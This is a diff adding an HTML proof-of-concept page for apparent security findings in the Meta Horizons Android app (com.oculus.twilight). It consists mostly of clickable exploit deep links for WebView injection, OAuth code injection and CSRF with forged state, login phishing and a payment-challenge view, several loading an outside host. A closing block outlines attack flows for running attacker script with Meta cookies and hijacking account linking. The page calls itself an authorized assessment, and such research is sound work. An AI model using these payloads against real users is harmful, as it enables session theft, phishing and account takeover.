@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Meta Horizons Security PoCs</title>
+<style>
+body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; max-width: 600px; margin: 40px auto; padding: 0 20px; background: #0a0a0a; color: #e0e0e0; }
+h1 { color: #ff6b35; font-size: 1.4em; }
+h2 { color: #58a6ff; font-size: 1.1em; margin-top: 24px; }
+h3 { color: #8b949e; font-size: 0.95em; margin-top: 16px; }
+.warning { background: #1a1a2e; border: 1px solid #ff6b35; padding: 16px; border-radius: 8px; margin: 20px 0; }
+.btn { display: inline-block; padding: 12px 24px; background: #ff6b35; color: white; text-decoration: none; border-radius: 6px; font-weight: 600; margin: 8px 4px; font-size: 14px; }
+.btn:hover { background: #e55a2b; }
+.btn-critical { background: #da3633; }
+.btn-critical:hover { background: #b62324; }
+.btn-payment { background: #d29922; color: #000; }
+.btn-native { background: #238636; }
+.btn-native:hover { background: #1a7f37; }
+code { background: #1a1a2e; padding: 2px 6px; border-radius: 4px; font-size: 0.9em; }
+pre { background: #1a1a2e; padding: 16px; border-radius: 8px; overflow-x: auto; font-size: 0.8em; }
+.info { color: #888; font-size: 0.9em; }
+.severity { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; }
+.sev-high { background: #da3633; color: #fff; }
+.sev-medium { background: #1f6feb; color: #fff; }
+.sev-low { background: #6e7681; color: #fff; }
+.section { border-top: 1px solid #21262d; padding-top: 16px; margin-top: 24px; }
+</style>
+</head>
+<body>
+<h1>Meta Horizons Security PoCs</h1>
+<p class="info">com.oculus.twilight v394.1.0.17.262 | Round 5 — 29 Findings</p>
+
+<div class="warning">
+<strong>Native Route Bypass:</strong> These deep links route to native Activities that bypass the React Native SceneTracker gate. They work on ANY device — no paired VR headset required. All dynamically confirmed via logcat activity chain tracing.
+</div>
+
+<div class="section">
+<h2>V-24: destination_url WebView Injection <span class="severity sev-high">HIGH</span></h2>
+<p>OAuth callback chain loads <code>destination_url</code> into authenticated WebView via <code>loadUrl()</code> without domain validation.</p>
+<a class="btn btn-critical" href="oculus://discord_oauth/callback?code=INJECTED&state=CSRF&destination_url=https://poc.zere.es/meta-horizons/">
+V-24: OAuth → WebView Injection
+</a>
+<a class="btn btn-critical" href="oculus://oauth_iab_stitching/callback?destination_url=https://poc.zere.es/meta-horizons/">
+V-24: IAB Stitching Variant
+</a>
+</div>
+
+<div class="section">
+<h2>V-25: TYI OAuth Code Injection <span class="severity sev-high">HIGH</span></h2>
+<p>Injects attacker's authorization code into TYI account-linking flow. No client-side state validation.</p>
+<a class="btn btn-critical" href="oculus://tyi/mobile/redirect/?code=ATTACKER_TYI_CODE&state=FORGED_STATE">
+V-25: TYI OAuth Injection
+</a>
+</div>
+
+<div class="section">
+<h2>V-27: agent.meta.ai Bypass <span class="severity sev-medium">MEDIUM</span></h2>
+<p>Empty parameter validation — any URI with <code>agent.meta.ai</code> host passes. Full URI forwarded as CALLBACK_URI_KEY.</p>
+<a class="btn btn-native" href="oculus://agent.meta.ai/anything?redirect_uri=https://poc.zere.es/meta-horizons/&token=INJECTED">
+V-27: agent.meta.ai Bypass
+</a>
+</div>
+
+<div class="section">
+<h2>V-28: OAuth CSRF (No State Validation) <span class="severity sev-medium">MEDIUM</span></h2>
+<p>Both OAuth activities forward <code>code</code> + <code>state</code> without client-side CSRF check.</p>
+<a class="btn btn-native" href="oculus://third_party_oauth/callback?code=ATTACKER_CODE&state=FORGED&redirect_uri=https://poc.zere.es">
+V-28: ThirdParty OAuth CSRF
+</a>
+<a class="btn btn-native" href="https://www.oculus.com/oauth_account_linking_mobile/login_redirect?code=ATTACKER_CODE&state=FORGED&error=">
+V-28: Account Linking CSRF
+</a>
+</div>
+
+<div class="section">
+<h2>V-29: Consent Flow Trigger <span class="severity sev-low">LOW</span></h2>
+<p>Triggers consent UI via deep link. Consent payload fetch attempted with attacker's <code>flow_name</code>.</p>
+<a class="btn" href="oculus://consent-launcher/?flow_name=data_download&redirect_uri=https://poc.zere.es">
+V-29: Consent Flow Trigger
+</a>
+</div>
+
+<div class="section">
+<h3>Native Route Confirmation (Round 5)</h3>
+<p class="info">These deep links route directly to native Activities, confirmed via logcat <code>ActivityTaskManager: START</code>:</p>
+<a class="btn btn-native" href="oculus://discord_oauth/callback?code=TEST">discord_oauth → MetaWebAuthActivity</a>
+<a class="btn btn-native" href="oculus://frl_login/?token=TEST&blob=TEST">frl_login → MetaWebAuthActivity</a>
+<a class="btn btn-native" href="oculus://oauth_account_linking/callback?code=TEST&state=TEST">oauth_account_linking → MetaWebAuthActivity</a>
+</div>
+
+<div class="section">
+<h2>Scene-Gated Routes (V-18 to V-22)</h2>
+<p class="info">These RN routes require a paired Quest headset (SceneTracker gate). Downgraded to Medium.</p>
+
+<h3>V-18: Authenticated WebView (MDC) <span class="severity sev-medium">MEDIUM</span></h3>
+<a class="btn" href="oculus://view/oc_mdc_loggedin_webview?url=https://poc.zere.es/meta-horizons/">
+V-18: MDC WebView
+</a>
+
+<h3>V-19: Third-Party Login Phishing <span class="severity sev-medium">MEDIUM</span></h3>
+<a class="btn" href="oculus://view/third_party_login?loginURL=https://poc.zere.es/meta-horizons/&domain=poc.zere.es&caller_app_name=Spotify">
+V-19: Login Phishing
+</a>
+
+<h3>V-20: 3DS2 Payment Challenge <span class="severity sev-medium">MEDIUM</span></h3>
+<a class="btn btn-payment" href="oculus://view/ocstore3_ds2_challenge?token=INJECTED&url=https://poc.zere.es/meta-horizons/">
+V-20: 3DS Challenge
+</a>
+
+<h3>V-21: In-App WebView <span class="severity sev-medium">MEDIUM</span></h3>
+<a class="btn" href="oculus://view/oc_webview?url=https://poc.zere.es/meta-horizons/&useInternalWebView=true">
+V-21: WebView
+</a>
+</div>
+
+<pre>
+Attack Flow — V-24 (OAuth → WebView Injection):
+1. Open redirect on Meta OAuth endpoint sets destination_url=attacker.com
+2. oculus://discord_oauth/callback?...&destination_url=https://attacker.com
+3. MetaWebAuthenticationActivity processes callback → CALLBACK_URI_KEY
+4. AuthenticatedWebViewBaseActivity extracts destination_url
+5. loadUrl(destination_url) — NO domain validation
+6. Attacker JS runs in authenticated WebView with Meta cookies
+
+Attack Flow — V-25 (TYI Account Linking Hijack):
+1. Attacker initiates OAuth with third-party provider, captures code
+2. oculus://*/tyi/mobile/redirect/?code=ATTACKER_CODE&state=FORGED
+3. TwilightTYIOAuthRedirectActivity → Bloks server page
+4. code+state forwarded raw (no client-side state check)
+5. Victim's Horizons account links to attacker's identity
+</pre>
+
+<p class="info">
+Authorized security assessment — 2026-10-23<br>
+29 findings | Pixel 6a / Android 16 | Dynamic + static analysis
+</p>
+</body>
+</html>
